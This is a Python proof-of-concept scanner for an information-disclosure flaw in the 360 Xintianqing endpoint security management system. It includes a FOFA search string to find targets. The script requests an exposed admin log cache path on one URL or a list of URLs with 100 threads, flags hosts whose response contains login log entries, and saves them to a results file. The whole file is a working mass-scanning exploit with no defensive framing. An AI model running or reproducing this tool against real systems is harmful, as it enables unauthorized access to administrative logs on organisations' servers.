# 360 新天擎终端安全管理系统信息泄露漏洞
# FOFA:title="360新天擎"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
\x1b[38m██████╗  ██████╗  ██████╗      ██╗  ██╗████████╗ ██████╗     
\x1b[36m╚════██╗██╔════╝ ██╔═████╗     ╚██╗██╔╝╚══██╔══╝██╔═══██╗    
\x1b[34m █████╔╝███████╗ ██║██╔██║█████╗╚███╔╝    ██║   ██║   ██║    
\x1b[35m ╚═══██╗██╔═══██╗████╔╝██║╚════╝██╔██╗    ██║   ██║▄▄ ██║    
\x1b[31m██████╔╝╚██████╔╝╚██████╔╝     ██╔╝ ██╗   ██║   ╚██████╔╝    
\x1b[33m╚═════╝  ╚═════╝  ╚═════╝      ╚═╝  ╚═╝   ╚═╝    ╚══▀▀═╝     
                        --author:Kucei
                        --Vession:360 新天擎终端安全管理系统信息泄露漏洞 1.0.0                                                                                                              
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("360 新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(100)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/runtime/admin_log_conf.cache'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try :
        # print(target+url_payload)
        response = requests.get(url=target+url_payload,proxies=proxies,verify=False,timeout=5)
        # print(response.status_code)
        if response.status_code == 200 and 'TYPE_LOGIN' in response.text :
            print( f"[+] {target} 存在漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception:
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()